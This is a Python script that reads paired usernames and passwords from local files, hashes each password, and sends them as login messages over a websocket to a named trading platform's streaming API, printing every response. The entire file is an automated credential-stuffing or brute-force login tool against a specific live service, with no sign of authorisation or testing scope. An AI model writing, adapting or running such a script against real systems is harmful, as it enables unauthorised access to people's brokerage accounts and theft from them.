import json
import hashlib
import websocket

# Define ANSI escape codes for text formatting
class Color:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

# read usernames from file
with open('usernames.txt') as f:
    usernames = [line.strip() for line in f.readlines()]

# read passwords from file
with open('pass.txt') as f:
    passwords = [line.strip() for line in f.readlines()]

# create the JSON data for the request
for i in range(len(usernames)):
    data = {
        "HED": {
            "msgTyp": 1,
            "channel": 1,
            "commVer": "DFNUAWEB_XX_Alkhabeer_X_1.001.22.3+56d90ac9",
            "loginId": "",
            "instId": "0",
            "sesnId": "",
            "routeId": "0",
            "clientIp": "",
            "tenantCode": "DEFAULT_TENANT",
            "unqReqId": f"0_{i}"
        },
        "DAT": {
            "lgnNme": usernames[i],
            "pwd": hashlib.sha256(passwords[i].encode()).hexdigest()
        }
    }

    # send the request using websocket
    ws = websocket.WebSocket()
    ws.connect('wss://alkhabeertadawul.com/streaming-api')
    request_msg = f"Request {i+1}: {json.dumps(data)}"
    print(Color.HEADER + request_msg + Color.ENDC)
    ws.send(json.dumps(data))
    response = ws.recv()
    response_msg = f"Response {i+1}: {response}"
    print(Color.OKGREEN + response_msg + Color.ENDC)
    ws.close()
    print("\n")
